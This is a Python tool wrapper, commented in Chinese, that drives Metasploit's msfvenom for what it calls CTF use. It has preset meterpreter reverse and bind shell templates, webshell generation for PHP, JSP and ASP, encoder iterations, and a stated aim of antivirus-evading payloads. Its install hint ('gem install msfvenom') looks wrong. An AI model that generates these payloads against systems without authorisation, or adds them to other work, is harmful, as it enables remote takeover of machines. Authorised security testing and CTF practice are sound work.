# tools/msfvenom_tool.py
"""
MSFvenom - Metasploit Payload 生成器

功能:
- 生成各种平台的 shellcode/payload
- 支持多种格式 (elf, exe, dll, jsp, php, etc.)
- 自定义编码器
- 支持 reverse/bind shell

CTF场景:
- 快速生成 reverse shell payload
- 生成 webshell
- 生成免杀 payload
"""
import os
import re
import shutil
import subprocess
from typing import Dict, Any, Optional, List
from tool_framework import CommandLineTool


class MSFvenomTool(CommandLineTool):
    """MSFvenom Payload 生成器封装"""

    # 常用 payload 模板
    PAYLOAD_TEMPLATES = {
        "linux_reverse": "linux/x64/meterpreter/reverse_tcp",
        "linux_bind": "linux/x64/meterpreter/bind_tcp",
        "windows_reverse": "windows/x64/meterpreter/reverse_tcp",
        "windows_bind": "windows/x64/meterpreter/bind_tcp",
        "php_reverse": "php/meterpreter/reverse_tcp",
        "jsp_reverse": "java/jsp_shell_reverse_tcp",
        "python_reverse": "python/meterpreter/reverse_tcp",
        "cmd_reverse": "cmd/unix/reverse_bash",
    }

    # 常用格式
    FORMAT_TYPES = [
        "elf", "elf-so", "exe", "exe-only", "dll", "asp", "aspx",
        "jsp", "war", "php", "python", "raw", "hex", "c", "powershell"
    ]

    def __init__(self):
        # 查找 msfvenom 路径
        self.executable = shutil.which("msfvenom")
        if not self.executable:
            # 检查 gem 安装路径
            gem_paths = [
                "/usr/local/bin/msfvenom",
                "/usr/bin/msfvenom",
            ]
            for path in gem_paths:
                if os.path.exists(path):
                    self.executable = path
                    break

        cmd = self.executable or "msfvenom"
        super().__init__(cmd)
        self.timeout = 60

    def name(self) -> str:
        return "msfvenom"

    def description(self) -> str:
        return "MSFvenom Payload 生成器，支持生成各平台的 reverse shell、webshell 等"

    def supported_vulns(self) -> list:
        return [
            "Payload Generation", "Reverse Shell", "Webshell",
            "Shellcode", "Meterpreter", "Privilege Escalation"
        ]

    def capability_statement(self) -> str:
        return "Payload 生成器。生成各平台的 reverse shell、bind shell、webshell。适合：获取初始 shell、生成 payload、webshell 上传。"

    def check_available(self) -> bool:
        if not self.executable:
            return False
        try:
            result = subprocess.run(
                [self.executable, "--version"],
                capture_output=True,
                timeout=10
            )
            return result.returncode == 0
        except Exception:
            return False

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "payload": {
                "type": "str",
                "description": "Payload 类型，如 windows/x64/meterpreter/reverse_tcp",
                "required": True
            },
            "lhost": {
                "type": "str",
                "description": "回调 IP 地址",
                "required": False
            },
            "lport": {
                "type": "int",
                "description": "回调端口",
                "required": False,
                "default": 4444
            },
            "format": {
                "type": "str",
                "description": f"输出格式: {', '.join(self.FORMAT_TYPES[:6])}...",
                "required": False,
                "default": "raw"
            },
            "encoder": {
                "type": "str",
                "description": "编码器，如 x86/shikata_ga_nai",
                "required": False
            },
            "iterations": {
                "type": "int",
                "description": "编码迭代次数",
                "required": False,
                "default": 1
            },
            "bad_chars": {
                "type": "str",
                "description": "坏字符，如 \\x00\\x0a",
                "required": False
            },
            "arch": {
                "type": "str",
                "description": "架构: x86, x64, etc.",
                "required": False
            },
            "platform": {
                "type": "str",
                "description": "平台: windows, linux, php, etc.",
                "required": False
            },
            "template": {
                "type": "str",
                "description": "预设模板: linux_reverse, windows_reverse, php_reverse, etc.",
                "required": False
            },
            "out_file": {
                "type": "str",
                "description": "输出文件路径（可选）",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {
                "success": False,
                "error": "MSFvenom 未安装。安装方法: gem install msfvenom",
                "vulnerable": False
            }

        # 处理模板
        template = params.get("template")
        if template and template in self.PAYLOAD_TEMPLATES:
            params["payload"] = self.PAYLOAD_TEMPLATES[template]

        payload = params.get("payload")
        if not payload:
            return {
                "success": False,
                "error": "必须指定 payload 类型或 template",
                "vulnerable": False
            }

        # 构建命令
        cmd = [self.executable, "-p", payload]

        # LHOST/LPORT
        lhost = params.get("lhost")
        lport = params.get("lport", 4444)
        if lhost:
            cmd.extend([f"LHOST={lhost}"])
        if lport:
            cmd.extend([f"LPORT={lport}"])

        # 格式
        fmt = params.get("format", "raw")
        cmd.extend(["-f", fmt])

        # 架构和平台
        if params.get("arch"):
            cmd.extend(["-a", params["arch"]])
        if params.get("platform"):
            cmd.extend(["--platform", params["platform"]])

        # 编码器
        encoder = params.get("encoder")
        if encoder:
            cmd.extend(["-e", encoder])
            iterations = params.get("iterations", 1)
            if iterations > 1:
                cmd.extend(["-i", str(iterations)])

        # 坏字符
        bad_chars = params.get("bad_chars")
        if bad_chars:
            cmd.extend(["-b", bad_chars])

        # 输出文件
        out_file = params.get("out_file")
        if out_file:
            cmd.extend(["-o", out_file])

        try:
            result = self._run_command(cmd, timeout=self.timeout)
            stdout = result.get("stdout", "")
            stderr = result.get("stderr", "")

            # 检查是否成功
            success = result.get("returncode", -1) == 0 and len(stdout) > 0

            return {
                "success": success,
                "payload": payload,
                "format": fmt,
                "lhost": lhost,
                "lport": lport,
                "output": stdout[:5000] if len(stdout) > 5000 else stdout,
                "output_size": len(stdout),
                "saved_to": out_file if out_file else None,
                "stderr": stderr[:500] if stderr else "",
                "command": " ".join(cmd[:10]) + ("..." if len(cmd) > 10 else "")
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False
            }

    def list_payloads(self, platform: str = None) -> List[str]:
        """列出可用的 payload"""
        if not self.check_available():
            return []

        cmd = [self.executable, "-l", "payloads"]
        if platform:
            cmd.extend(["--platform", platform])

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                lines = result.stdout.strip().split("\n")
                return [line.split()[0] for line in lines if line.strip() and not line.startswith("#")]
        except Exception:
            pass
        return []

    def list_encoders(self) -> List[str]:
        """列出可用的编码器"""
        if not self.check_available():
            return []

        try:
            result = subprocess.run(
                [self.executable, "-l", "encoders"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                lines = result.stdout.strip().split("\n")
                return [line.split()[0] for line in lines if line.strip() and not line.startswith("#")]
        except Exception:
            pass
        return []

    # ==================== 快捷方法 ====================

    def generate_reverse_shell(self, lhost: str, lport: int = 4444,
                                platform: str = "linux", arch: str = "x64") -> Dict:
        """快速生成 reverse shell payload"""
        payload_map = {
            ("linux", "x64"): "linux/x64/meterpreter/reverse_tcp",
            ("linux", "x86"): "linux/x86/meterpreter/reverse_tcp",
            ("windows", "x64"): "windows/x64/meterpreter/reverse_tcp",
            ("windows", "x86"): "windows/x86/meterpreter/reverse_tcp",
        }

        payload = payload_map.get((platform, arch), "linux/x64/meterpreter/reverse_tcp")
        return self.execute("", {
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
            "platform": platform,
            "arch": arch,
            "format": "raw"
        })

    def generate_webshell(self, shell_type: str, lhost: str, lport: int = 4444) -> Dict:
        """生成 webshell payload"""
        payload_map = {
            "php": "php/meterpreter/reverse_tcp",
            "jsp": "java/jsp_shell_reverse_tcp",
            "asp": "windows/meterpreter/reverse_tcp",
            "aspx": "windows/meterpreter/reverse_tcp",
        }

        payload = payload_map.get(shell_type)
        if not payload:
            return {"success": False, "error": f"不支持的 webshell 类型: {shell_type}"}

        return self.execute("", {
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
            "format": shell_type
        })


def register():
    """注册 MSFvenom 工具"""
    from tool_framework import ToolRegistry
    tool = MSFvenomTool()
    ToolRegistry.register(tool)